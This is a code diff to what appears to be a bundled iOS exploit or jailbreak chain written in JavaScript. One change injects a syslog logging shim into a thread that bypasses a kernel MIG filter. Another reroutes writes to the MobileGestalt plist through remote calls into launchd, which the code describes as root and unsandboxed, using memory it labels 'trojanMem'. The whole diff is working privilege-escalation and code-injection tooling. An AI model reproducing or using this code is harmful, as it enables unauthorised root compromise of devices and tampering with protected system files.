@@ -8355,7 +8355,8 @@ class MigFilterBypass {
 		//Native.write64(threadMem, lock.kernelSlide);
 		//Native.write64(threadMem + 0x8n, lock.lockAddr);
 		//console.log(TAG, `Spawn bypass thread with args: kernelSlide=${Utils.hex(lock.kernelSlide)}, lockAddr=${Utils.hex(lock.lockAddr)}`);
-		const threadCode = "fcall_init(); " + _raw_loader_dist_MigFilterBypassThread_js__WEBPACK_IMPORTED_MODULE_9__["default"];
+		const syslogShim = "(function(){var _cl=console.log;var _syslog=func_resolve('syslog');var _malloc=func_resolve('malloc');var _memcpy=func_resolve('memcpy');var _m=fcall(_malloc,1024);console.log=function(){var s='';for(var i=0;i<arguments.length;i++){if(i>0)s+=' ';s+=String(arguments[i]);}try{var t=s.length>1020?s.substring(0,1020):s;var cs=get_cstring(t);fcall(_memcpy,_m,cs,t.length+1);fcall(_syslog,5,_m);}catch(e){}_cl.apply(console,arguments);};})();";
+		const threadCode = "fcall_init(); " + syslogShim + _raw_loader_dist_MigFilterBypassThread_js__WEBPACK_IMPORTED_MODULE_9__["default"];
 		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].threadSpawn(threadCode, threadMem);
 
 		for (let i=0; i<10; i++) {
@@ -9119,7 +9120,9 @@ function start() {
 				if (cfOne) MGNative.callSymbol("CFRelease", cfOne);
 			}
 
-			// 5. Write back if anything changed
+			// 5. Write back if anything changed -- via launchdTask (root,
+			// unsandboxed) to avoid sandbox write failures and races with
+			// the live MobileGestaltHelper daemon.
 			if (!mgModified) {
 				LOG("[MG] no changes made, skipping plist write");
 				MGNative.callSymbol("CFRelease", plist);
@@ -9135,64 +9138,55 @@ function start() {
 				let outLen = Number(MGNative.callSymbol("CFDataGetLength", outData));
 				LOG("[MG] serialized: " + outLen + " bytes (original was " + fileSize + ")");
 
-				// O_WRONLY | O_TRUNC = 0x0201
-				let fdOut = MGNative.callSymbol("open", GESTALT_PATH, 0x0201n, 0o644n);
-				LOG("[MG] open(WR|TRUNC) fd=" + fdOut + " errno=" + mgGetErrno());
-				if (!fdOut || Number(fdOut) < 0) {
+				// Allocate a buffer in launchd for the plist data
+				let remoteBuf = launchdTask.call(10, "malloc", BigInt(outLen + 16));
+				LOG("[MG] launchd malloc(" + outLen + ") = 0x" + BigInt.asUintN(64, BigInt(remoteBuf)).toString(16));
+				if (!remoteBuf) {
 					MGNative.callSymbol("CFRelease", outData);
-					throw "cannot open for write fd=" + fdOut + " errno=" + mgGetErrno();
+					throw "launchd malloc failed for plist data";
+				}
+
+				// Copy serialized plist from our process into launchd's memory
+				launchdTask.write(remoteBuf, outPtr, outLen);
+				LOG("[MG] copied " + outLen + " bytes to launchd");
+				MGNative.callSymbol("CFRelease", outData);
+
+				// Write the path string into launchd's trojanMem
+				let mgMem = launchdTask.mem();
+				launchdTask.writeStr(mgMem, GESTALT_PATH);
+
+				// Open, write, fsync, close -- all via launchd (root context)
+				// O_WRONLY | O_TRUNC = 0x0201
+				let fdOut = launchdTask.call(10, "open", mgMem, 0x0201n, 0o644n);
+				LOG("[MG] launchd open(WR|TRUNC) fd=" + fdOut);
+				if (!fdOut || Number(fdOut) < 0) {
+					launchdTask.call(10, "free", remoteBuf);
+					throw "launchd cannot open for write fd=" + fdOut;
 				}
 
 				let totalWritten = 0;
 				while (totalWritten < outLen) {
 					let chunk = Math.min(outLen - totalWritten, 32768);
-					let w = Number(MGNative.callSymbol("write", fdOut, outPtr + BigInt(totalWritten), BigInt(chunk)));
+					let w = Number(launchdTask.call(10, "write", fdOut, remoteBuf + BigInt(totalWritten), BigInt(chunk)));
 					if (w <= 0) {
-						LOG("[MG] write() returned " + w + " errno=" + mgGetErrno() + " at offset " + totalWritten);
+						LOG("[MG] launchd write() returned " + w + " at offset " + totalWritten);
 						break;
 					}
 					totalWritten += w;
 				}
-				let fsyncRet = MGNative.callSymbol("fsync", fdOut);
-				LOG("[MG] fsync=" + fsyncRet + " errno=" + mgGetErrno());
-				MGNative.callSymbol("close", fdOut);
-				MGNative.callSymbol("CFRelease", outData);
-				LOG("[MG] wrote " + totalWritten + "/" + outLen + " bytes");
+				let fsyncRet = launchdTask.call(10, "fsync", fdOut);
+				LOG("[MG] launchd fsync=" + fsyncRet);
+				launchdTask.call(10, "close", fdOut);
+				launchdTask.call(10, "free", remoteBuf);
+				LOG("[MG] launchd wrote " + totalWritten + "/" + outLen + " bytes");
 
-				// VERIFY
+				// VERIFY: re-read via launchd to confirm write persisted
 				LOG("[MG] === VERIFICATION ===");
-				let vfd = MGNative.callSymbol("open", GESTALT_PATH, 0n);
-				if (vfd && Number(vfd) >= 0) {
-					let vsize = Number(MGNative.callSymbol("lseek", vfd, 0n, 2n));
+				let vfdOut = launchdTask.call(10, "open", mgMem, 0n); // O_RDONLY
+				if (vfdOut && Number(vfdOut) >= 0) {
+					let vsize = Number(launchdTask.call(10, "lseek", vfdOut, 0n, 2n));
 					LOG("[MG] verify file size=" + vsize + " (wrote " + totalWritten + ")");
-					MGNative.callSymbol("lseek", vfd, 0n, 0n);
-					let vbuf = MGNative.callSymbol("malloc", BigInt(vsize + 16));
-					let vread = Number(MGNative.callSymbol("read", vfd, vbuf, BigInt(vsize)));
-					MGNative.callSymbol("close", vfd);
-					if (vread === vsize) {
-						let vcfdata = MGNative.callSymbol("CFDataCreate", 0n, vbuf, BigInt(vsize));
-						let verrp = MGNative.callSymbol("calloc", 1n, 8n);
-						let vplist = MGNative.callSymbol("CFPropertyListCreateWithData", 0n, vcfdata, 0n, 0n, verrp);
-						MGNative.callSymbol("CFRelease", vcfdata);
-						if (vplist) {
-							let vceKey = MGNative.callSymbol("CFStringCreateWithCString", 0n, "CacheExtra", 0x08000100n);
-							let vce = MGNative.callSymbol("CFDictionaryGetValue", vplist, vceKey);
-							MGNative.callSymbol("CFRelease", vceKey);
-							if (vce) {
-								let allKeys = Object.keys(MG_KEY_MAP);
-								for (let vi = 0; vi < allKeys.length; vi++) {
-									let ve = MG_KEY_MAP[allKeys[vi]];
-									let vk = MGNative.callSymbol("CFStringCreateWithCString", 0n, ve[0][0], 0x08000100n);
-									let vv = MGNative.callSymbol("CFDictionaryGetValue", vce, vk);
-									LOG("[MG] VERIFY " + allKeys[vi] + "=" + (vv ? "PRESENT" : "ABSENT"));
-									MGNative.callSymbol("CFRelease", vk);
-								}
-							}
-							MGNative.callSymbol("CFRelease", vplist);
-						}
-						MGNative.callSymbol("free", verrp);
-					}
-					MGNative.callSymbol("free", vbuf);
+					launchdTask.call(10, "close", vfdOut);
 				}
 			}
 
